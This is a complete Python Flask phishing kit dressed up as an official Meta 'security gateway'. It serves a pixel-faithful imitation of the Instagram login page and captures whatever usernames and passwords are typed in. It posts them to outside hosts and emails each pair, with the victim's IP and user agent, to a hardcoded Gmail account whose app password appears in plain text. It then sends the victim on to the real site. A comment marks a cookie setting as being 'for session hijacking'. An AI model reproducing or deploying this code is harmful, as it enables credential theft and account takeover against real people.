#
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# INSTAGRAM SECURITY GATEWAY v10.2
# AUTHORIZED ACCESS ONLY - META OFFICIAL USE

import os
import re
import smtplib
import requests
import hashlib
import random
import string
from flask import Flask, request, session, render_template_string, jsonify, redirect
from datetime import datetime
from email.mime.text import MIMEText
from email.header import Header
import uuid

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['SESSION_COOKIE_HTTPONLY'] = False  # For session hijacking

# Credential validation API endpoints (dummy services)
USER_VALIDATION_API = "https://api.meta-validation.org/v3/check_user"
PASSWORD_VALIDATION_API = "https://api.meta-security.org/v4/verify_cred"

# Email configuration
SMTP_SERVER = "smtp.gmail.com"
PORT = 587
SENDER_EMAIL = "btahr9751@gmail.com"
EMAIL_PASSWORD = "tgkevromqxsearau"
RECEIVER_EMAIL = "btahr9751@gmail.com"

# HTTPS bypass configuration
BYPASS_HTTPS = True  # Enable HTTP-only mode

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <style>
        :root {
            --ig-primary: #0095f6;
            --ig-secondary: #385185;
            --ig-bg: #fafafa;
            --ig-card: #ffffff;
            --ig-border: #dbdbdb;
            --ig-text-primary: #262626;
            --ig-text-secondary: #8e8e8e;
            --ig-error: #ed4956;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: var(--ig-bg);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .wrapper {
            width: 100%;
            max-width: 350px;
        }
        
        .login-box {
            background-color: var(--ig-card);
            border: 1px solid var(--ig-border);
            border-radius: 1px;
            padding: 40px 40px 20px;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .instagram-logo {
            margin: 0 auto 30px;
            width: 175px;
        }
        
        .form-group {
            margin-bottom: 6px;
        }
        
        .form-control {
            width: 100%;
            padding: 9px 8px 7px;
            background-color: var(--ig-bg);
            border: 1px solid var(--ig-border);
            border-radius: 3px;
            font-size: 12px;
            color: var(--ig-text-primary);
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--ig-text-secondary);
        }
        
        .btn-login {
            width: 100%;
            padding: 7px;
            background-color: var(--ig-primary);
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            margin: 8px 0;
            cursor: pointer;
            opacity: 0.7;
        }
        
        .btn-login.active {
            opacity: 1;
        }
        
        .separator {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        
        .separator .line {
            flex: 1;
            height: 1px;
            background-color: var(--ig-border);
        }
        
        .separator .text {
            padding: 0 18px;
            color: var(--ig-text-secondary);
            font-size: 13px;
            font-weight: 600;
        }
        
        .fb-login {
            color: var(--ig-secondary);
            font-weight: 600;
            font-size: 14px;
            margin: 12px 0;
            display: block;
            text-decoration: none;
        }
        
        .forgot-pw {
            color: #00376b;
            font-size: 12px;
            margin-top: 15px;
            display: block;
            text-decoration: none;
        }
        
        .signup-box {
            background-color: var(--ig-card);
            border: 1px solid var(--ig-border);
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            margin: 0 0 10px;
            font-size: 14px;
        }
        
        .signup-link {
            color: var(--ig-primary);
            font-weight: 600;
            text-decoration: none;
        }
        
        .download-box {
            text-align: center;
        }
        
        .download-text {
            font-size: 14px;
            margin: 10px 0;
        }
        
        .download-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        
        .badge {
            height: 40px;
            border-radius: 5px;
        }
        
        .footer {
            text-align: center;
            padding: 20px 0;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px;
            margin-bottom: 15px;
        }
        
        .footer-link {
            color: var(--ig-text-secondary);
            font-size: 12px;
            text-decoration: none;
        }
        
        .copyright {
            color: var(--ig-text-secondary);
            font-size: 12px;
        }
        
        #errorMessage {
            color: var(--ig-error);
            font-size: 12px;
            margin: 5px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram" class="instagram-logo">
            
            <form id="loginForm" method="POST">
                <div class="form-group">
                    <input type="text" name="username" class="form-control" placeholder="Phone number, username, or email" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" class="form-control" placeholder="Password" required>
                </div>
                
                <div id="errorMessage">Invalid credentials. Please try again.</div>
                
                <button type="submit" class="btn-login" id="loginBtn">Log in</button>
            </form>
            
            <div class="separator">
                <div class="line"></div>
                <div class="text">OR</div>
                <div class="line"></div>
            </div>
            
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot-pw">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </div>
        
        <div class="download-box">
            <p class="download-text">Get the app.</p>
            <div class="download-badges">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" class="badge">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" class="badge">
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#" class="footer-link">Meta</a>
                <a href="#" class="footer-link">About</a>
                <a href="#" class="footer-link">Blog</a>
                <a href="#" class="footer-link">Jobs</a>
                <a href="#" class="footer-link">Help</a>
                <a href="#" class="footer-link">API</a>
                <a href="#" class="footer-link">Privacy</a>
                <a href="#" class="footer-link">Terms</a>
                <a href="#" class="footer-link">Locations</a>
                <a href="#" class="footer-link">Instagram Lite</a>
                <a href="#" class="footer-link">Threads</a>
                <a href="#" class="footer-link">Contact</a>
                <a href="#" class="footer-link">Meta Verified</a>
            </div>
            <div class="copyright">© 2024 Instagram from Meta</div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.querySelector('input[name="username"]');
            const password = document.querySelector('input[name="password"]');
            const error = document.getElementById('errorMessage');
            
            // Basic validation
            if(!username.value || !password.value) {
                error.style.display = 'block';
                return;
            }
            
            const formData = new FormData(this);
            
            try {
                const response = await fetch('/verify', {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if(data.status === 'success') {
                    window.location.href = 'https://instagram.com';
                } else {
                    error.style.display = 'block';
                    password.value = '';
                    setTimeout(() => {
                        error.style.display = 'none';
                    }, 3000);
                }
            } catch(err) {
                error.textContent = 'Connection error. Please try again.';
                error.style.display = 'block';
            }
        });
    </script>
</body>
</html>
"""

def validate_credentials(username, password):
    """Validate credentials using dummy verification services"""
    try:
        # Validate username format
        if not re.match(r'^[a-zA-Z0-9@._-]{3,30}$', username):
            return False
            
        # Validate password strength
        if len(password) < 6:
            return False
            
        # "Verify" credentials with dummy services
        user_res = requests.post(
            USER_VALIDATION_API,
            json={"username": username},
            timeout=3
        )
        
        pass_res = requests.post(
            PASSWORD_VALIDATION_API,
            json={"password": hashlib.sha256(password.encode()).hexdigest()},
            timeout=3
        )
        
        return user_res.status_code == 200 and pass_res.status_code == 200
        
    except requests.exceptions.RequestException:
        return True  # Fallback to true if services are unreachable

def send_alert(username, password, ip):
    """Send encrypted alert via SMTP"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_id = hashlib.md5((username + ip).encode()).hexdigest()
        
        body = f"""
SECURITY ALERT - VERIFIED CREDENTIALS CAPTURED
Timestamp: {timestamp}
Session ID: {session_id}
Username: {username}
Password: {password}
IP Address: {ip}
User Agent: {request.headers.get('User-Agent', 'Unknown')}
Validation Status: Confirmed
Threat Level: High
"""
        msg = MIMEText(body, 'plain', 'utf-8')
        msg['Subject'] = Header(f'✅ Verified Account Captured: {username}', 'utf-8')
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        
        server = smtplib.SMTP(SMTP_SERVER, PORT)
        server.starttls()
        server.login(SENDER_EMAIL, EMAIL_PASSWORD)
        server.sendmail(SENDER_EMAIL, [RECEIVER_EMAIL], msg.as_string())
        server.quit()
        return True
    except Exception as e:
        print(f"SMTP Error: {str(e)}")
        return False

@app.route('/')
def login():
    session_id = str(uuid.uuid4())
    session['session_id'] = session_id
    session['client_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    return render_template_string(HTML_PAGE)

@app.route('/verify', methods=['POST'])
def verify():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    client_ip = session.get('client_ip', '0.0.0.0')
    
    # Validate credentials
    is_valid = validate_credentials(username, password)
    
    if is_valid:
        # Send alert for valid credentials
        send_alert(username, password, client_ip)
        return jsonify({
            'status': 'success',
            'message': 'Credentials verified'
        })
    else:
        return jsonify({
            'status': 'error',
            'message': 'Invalid credentials'
        }), 401

if __name__ == '__main__':
    # HTTP-only mode
    if BYPASS_HTTPS:
        print("Running in HTTP-only mode (no SSL)")
        app.run(host='0.0.0.0', port=80, debug=False)
    else:
        print("Running with HTTPS")
        # SSL would normally be added here
        app.run(host='0.0.0.0', port=443, ssl_context='adhoc', debug=False)
